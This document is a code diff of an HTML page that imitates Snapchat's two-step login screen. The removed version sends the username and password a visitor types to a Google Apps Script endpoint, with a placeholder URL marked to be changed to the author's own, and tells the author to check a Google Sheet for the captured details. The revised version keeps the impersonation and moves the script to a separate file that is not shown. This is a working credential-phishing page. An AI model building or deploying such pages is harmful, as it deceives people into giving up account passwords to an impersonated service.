@@ -1,192 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Log in | Snapchat</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      font-family: 'Inter', system-ui, sans-serif;
-      background: #f8f8f8;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0;
-    }
-    .container {
-      width: 100%;
-      max-width: 380px;
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      overflow: hidden;
-    }
-    .header {
-      background: #000;
-      color: white;
-      padding: 12px 16px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      font-size: 14px;
-    }
-    .yellow-btn {
-      background: #fffc00;
-      color: black;
-      font-weight: 600;
-      padding: 12px 24px;
-      border-radius: 50px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin: 20px auto;
-      width: fit-content;
-      text-decoration: none;
-      font-size: 15px;
-    }
-    .login-box {
-      padding: 30px 24px 40px;
-      text-align: center;
-    }
-    .snap-logo {
-      width: 70px;
-      height: 70px;
-      margin: 0 auto 20px;
-    }
-    h1 {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 30px;
-    }
-    .input-group {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-    label {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 6px;
-      display: block;
-    }
-    input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1px solid #ddd;
-      border-radius: 12px;
-      font-size: 16px;
-    }
-    .not-you {
-      color: #00a8ff;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .forgot {
-      color: #00a8ff;
-      text-align: center;
-      margin: 20px 0;
-      font-size: 15px;
-      cursor: pointer;
-    }
-    .next-btn {
-      background: #00a8ff;
-      color: white;
-      border: none;
-      padding: 14px 60px;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      display: block;
-      margin: 10px auto 0;
-    }
-  </style>
+  <link rel="stylesheet" href="style2.css" />
 </head>
 <body>
 
-  <div class="container">
-    <div class="header">
-      <div>×</div>
-      <div>Log in | Snapc...</div>
-      <div>⋯</div>
-    </div>
+  <!-- First Screen: Username -->
+  <div id="screen1" class="screen active">
+    <div class="snapchat-container">
+      <button class="open-snapchat">
+        👻 Open Snapchat
+      </button>
 
-    <a href="#" class="yellow-btn">👻 Open Snapchat</a>
+      <div class="login-card">
+        <div class="logo">👻</div>
+        <h1>Log in to Snapchat</h1>
 
-    <!-- Screen 1 -->
-    <div id="screen1" class="login-box">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" class="snap-logo" alt="Snapchat">
-      <h1>Log in to Snapchat</h1>
-      
-      <div class="input-group">
-        <label>Username or email</label>
-        <input type="text" id="username" placeholder="">
+        <div class="input-group">
+          <label>Username or email</label>
+          <input type="text" id="username" placeholder="" autofocus />
+        </div>
+
+        <a href="#" class="phone-link">Use a phone number instead</a>
+
+        <button class="next-btn" onclick="goToPassword()">Next</button>
+
+        <div class="divider">
+          <span>or</span>
+        </div>
+
+        <button class="google-btn">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png" alt="G"/>
+          Continue with Google
+        </button>
+
+        <div class="signup">
+          Using Snapchat for the first time? <a href="#">Sign up</a>
+        </div>
       </div>
-
-      <a href="#" style="color:#00a8ff; font-size:15px;">Use a phone number instead</a>
-
-      <button onclick="goToPassword()" class="next-btn">next</button>
-    </div>
-
-    <!-- Screen 2 -->
-    <div id="screen2" class="login-box" style="display:none;">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" class="snap-logo" alt="Snapchat">
-      <h1>Enter Password</h1>
-      
-      <div style="background:#f8f8f8; padding:12px 16px; border-radius:12px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
-        <span id="display-username">alex_rohnn</span>
-        <span onclick="goBack()" class="not-you">Not you?</span>
-      </div>
-
-      <div class="input-group">
-        <label>Password</label>
-        <input type="password" id="password">
-      </div>
-
-      <div onclick="alert('Forgot password flow')" class="forgot">Forgot Password</div>
-
-      <button onclick="submitLogin()" class="next-btn">Next</button>
     </div>
   </div>
 
-  <script>
-    const webAppUrl = "https://script.google.com/macros/s/YOUR_APPS_SCRIPT_URL_HERE/exec"; // ← CHANGE THIS TO YOUR REAL URL
+  <!-- Second Screen: Password -->
+  <div id="screen2" class="screen">
+    <div class="snapchat-container">
+      <button class="open-snapchat">
+        👻 Open Snapchat
+      </button>
 
-    function goToPassword() {
-      const username = document.getElementById('username').value.trim() || "alex_rohnn";
-      document.getElementById('display-username').textContent = username;
-      document.getElementById('screen1').style.display = 'none';
-      document.getElementById('screen2').style.display = 'block';
-    }
+      <div class="login-card">
+        <div class="logo">👻</div>
+        <h1>Enter Password</h1>
 
-    function goBack() {
-      document.getElementById('screen2').style.display = 'none';
-      document.getElementById('screen1').style.display = 'block';
-    }
+        <div class="username-row">
+          <span class="displayusername"></span>
+          <a href="#" onclick="goToUsername()" class="not-you">Not you?</a>
+        </div>
 
-    async function submitLogin() {
-      const username = document.getElementById('display-username').textContent.trim();
-      const password = document.getElementById('password').value.trim();
+        <div class="input-group">
+          <label>Password</label>
+          <div class="password-wrapper">
+            <input type="password" id="password" placeholder=""/>
+            <span class="toggle-eye" onclick="togglePassword()">👁️</span>
+          </div>
+        </div>
 
-      if (!password) {
-        alert("Please enter a password");
-        return;
-      }
+        <a href="#" class="forgot">Forgot Password</a>
 
-      try {
-        await fetch(webAppUrl, {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({username, password})
-        });
-        alert("✅ Details sent successfully! Check your Google Sheet.");
-        document.getElementById('password').value = "";
-      } catch(e) {
-        alert("Error sending data. Check your Google Apps Script URL.");
-      }
-    }
-  </script>
+        <button class="next-btn" onclick="alert('Logged in! (Demo)')">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
 </body>
 </html>
